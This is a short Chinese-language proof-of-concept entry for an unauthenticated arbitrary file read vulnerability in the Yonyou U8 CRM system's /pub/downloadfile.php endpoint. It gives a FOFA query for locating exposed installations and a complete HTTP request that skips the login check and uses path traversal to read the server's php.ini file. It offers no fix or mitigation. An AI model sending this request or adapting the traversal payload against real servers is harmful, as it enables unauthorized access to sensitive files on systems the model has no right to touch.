## 用友U8-CRM客户关系管理系统downloadfile.php存在任意文件读取漏洞

用友U8 CRM客户关系管理系统/pub/downloadfile.php存在任意文件读取漏洞，未经身份验证的远程攻击者通过漏洞可以获取到服务器敏感信息。

## fofa
```
app="用友U8CRM"
```

## poc
```
GET /pub/downloadfile.php?DontCheckLogin=1&url=/datacache/../../../apache/php.ini HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```
